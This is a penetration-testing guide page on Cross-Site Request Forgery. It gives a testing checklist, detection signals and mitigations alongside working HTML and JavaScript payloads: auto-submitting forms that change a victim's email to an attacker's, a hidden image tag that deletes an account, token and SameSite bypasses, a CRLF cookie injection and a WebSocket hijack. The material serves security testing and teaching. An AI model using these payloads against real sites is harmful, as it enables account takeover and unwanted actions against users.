% Filename: 04-web-testing/client-side/csrf.md
% Display name: Cross-Site Request Forgery (CSRF)
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1189 (Drive-by Compromise)
% Authors: @TristanInSec

# Cross-Site Request Forgery (CSRF)

## Overview

CSRF forces authenticated users to perform unintended actions by submitting requests from an attacker-controlled page. The victim's browser automatically attaches cookies (including session cookies) to cross-origin requests — if the application relies solely on cookies for authentication and has no CSRF protection, the attacker can execute any action the victim is authorized to perform.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1189 - Drive-by Compromise

## Prerequisites

- Application uses cookie-based authentication
- No CSRF tokens, or tokens are bypassable
- SameSite cookie attribute is not set or is set to `None`
- Target action uses a predictable request format (no random values required)
- Victim must be authenticated and visit the attacker's page

## Detection Methodology

### Identifying CSRF-Vulnerable Endpoints

Check state-changing endpoints (POST, PUT, DELETE) for:

1. **No CSRF token** — form submissions and API calls without a token parameter
2. **Token in cookie only** — token present but only in a cookie (not in the request body or header)
3. **Token not validated** — token present but the server accepts requests without it or with an arbitrary value
4. **Method override** — endpoint accepts GET instead of POST (GET requests are easier to trigger cross-origin)

### Testing Checklist

```text
1. Submit the request without the CSRF token — does it succeed?
2. Submit with an empty token value — does it succeed?
3. Submit with a random/invalid token — does it succeed?
4. Submit another user's valid token — does it succeed? (token not tied to session)
5. Change POST to GET — does it succeed?
6. Change Content-Type from application/json to application/x-www-form-urlencoded — does it succeed?
```

## Techniques

### Basic CSRF — Auto-Submitting Form

Simplest attack — an HTML form that submits automatically when the victim loads the page:

```html
<html>
<body>
<form id="csrf" action="http://target.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

The victim's browser sends the POST with their session cookie attached.

### CSRF via Image Tag (GET-Based)

If the endpoint accepts GET requests for state-changing actions:

```html
<img src="http://target.com/account/delete?confirm=true" style="display:none">
```

### CSRF with JSON Body

Modern APIs often require `Content-Type: application/json`. HTML forms cannot set this content type — but there are workarounds.

**Flash/fetch-based (requires permissive CORS):**

```html
<script>
fetch('http://target.com/api/email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: '{"email":"attacker@evil.com"}'
});
</script>
```

This only works if the target's CORS policy allows the attacker's origin with `credentials: include`. If CORS blocks it, the browser sends a preflight `OPTIONS` request and the attack fails.

**Form-based workaround (if server accepts form encoding):**

Some applications accept `application/x-www-form-urlencoded` even when they expect JSON. Test by submitting the JSON as a form parameter name:

```html
<form action="http://target.com/api/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

The body becomes: `{"email":"attacker@evil.com","ignore":"="}` — valid JSON that the server may parse.

### CSRF Token Bypass Techniques

**Token removal:**

Simply delete the token parameter from the request. If the server only validates the token when it is present, omitting it bypasses the check.

**Token reuse (non-session-bound):**

If tokens are not tied to the user's session:
1. Create an account on the application
2. Get a valid CSRF token from your own session
3. Use that token in the CSRF attack — it may be accepted for any user

**Token in cookie (double-submit pattern vulnerability):**

If the CSRF defense compares a token in the cookie with a token in the request body, and the attacker can set cookies (via XSS, CRLF injection, or subdomain control):

```html
<!-- Set cookie via subdomain or CRLF injection -->
<img src="http://target.com/page?param=%0d%0aSet-Cookie:%20csrf=attacker_token" style="display:none">

<!-- Then submit form with matching token -->
<form action="http://target.com/account/email" method="POST">
  <input type="hidden" name="csrf" value="attacker_token">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

**Referer header bypass:**

If CSRF protection relies on the `Referer` header:

```html
<!-- Suppress Referer entirely -->
<meta name="referrer" content="no-referrer">
<form action="http://target.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

If the server only checks Referer when it is present and accepts requests without it, this bypasses the protection.

### SameSite Cookie Bypass

The `SameSite` cookie attribute controls cross-site cookie inclusion:

- `SameSite=Strict` — cookie never sent in cross-site requests (strong CSRF protection)
- `SameSite=Lax` — cookie sent in cross-site top-level GET navigations (links, redirects) but not in POST/iframe/AJAX requests
- `SameSite=None; Secure` — cookie always sent cross-site (requires HTTPS)

**Lax bypass via GET:**

If `SameSite=Lax` and the target accepts GET for state changes:

```html
<!-- Top-level navigation (Lax sends cookies) -->
<a href="http://target.com/account/delete?confirm=true" id="link">Click</a>
<script>document.getElementById('link').click();</script>
```

**Lax bypass via method override:**

Some frameworks support method override headers/parameters:

```html
<form action="http://target.com/account/email?_method=POST" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

### CSRF via WebSocket

WebSocket connections do not enforce the same-origin policy by default. If the server does not validate the `Origin` header during the WebSocket handshake:

```html
<script>
var ws = new WebSocket('ws://target.com/ws');
ws.onopen = function() {
  ws.send('{"action":"change_email","email":"attacker@evil.com"}');
};
</script>
```

## Detection Methods

### Network-Based Detection

- Cross-origin POST requests to state-changing endpoints
- Requests missing expected CSRF tokens or with repeated/static tokens
- `Referer` header indicating an external origin on sensitive endpoints
- Abnormal patterns of authenticated requests originating from external referrers

### Host-Based Detection

- Server-side CSRF token validation failures in application logs
- State-changing actions triggered without corresponding UI interaction patterns
- Anomalous `Origin` or `Referer` headers on authenticated requests

## Mitigation Strategies

- **Synchronizer token pattern** — generate a random token per session (or per request), include it in forms as a hidden field and validate server-side. The token must not be predictable or reusable across sessions
- **SameSite cookies** — set `SameSite=Lax` (minimum) or `SameSite=Strict` on session cookies. `Lax` prevents most CSRF except top-level GET navigations
- **Double-submit cookie** — store a random token in both a cookie and request parameter, compare server-side. Weaker than synchronizer tokens (vulnerable if attacker can set cookies via subdomain or injection)
- **Custom request headers** — require a custom header (e.g., `X-Requested-With`) on state-changing requests. Simple cross-origin forms cannot set custom headers. Only works if CORS does not permit the attacker's origin
- **Referer/Origin validation** — check `Origin` or `Referer` headers against the expected domain. Defense-in-depth only — some browsers/proxies strip these headers
- **Re-authentication for sensitive actions** — require password or MFA confirmation for critical operations (password change, email change, money transfer)

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Cross-Site Request Forgery](https://portswigger.net/web-security/csrf)
- [OWASP - Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
- [OWASP - CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### MITRE ATT&CK

- [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)
